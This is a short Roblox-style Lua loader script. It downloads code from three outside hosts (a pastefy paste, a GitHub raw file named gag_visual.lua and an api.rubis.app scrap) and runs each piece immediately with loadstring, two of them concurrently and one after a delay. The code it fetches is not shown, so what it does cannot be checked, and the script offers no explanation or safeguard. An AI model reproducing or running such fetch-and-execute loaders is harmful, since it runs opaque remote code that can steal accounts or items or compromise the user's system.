-- Load the first script
loadstring(game:HttpGet("https://pastefy.app/G5j1Jn9m/raw"))()

-- Run additional scripts concurrently
pcall(function()
    -- Script with delay to reduce freezing
    task.spawn(function()
        task.wait(8)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))()
    end)

    -- Script that runs immediately
    task.spawn(function()
        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/HYyF83MW2AqMAnmE/raw", true))()
    end)
end)
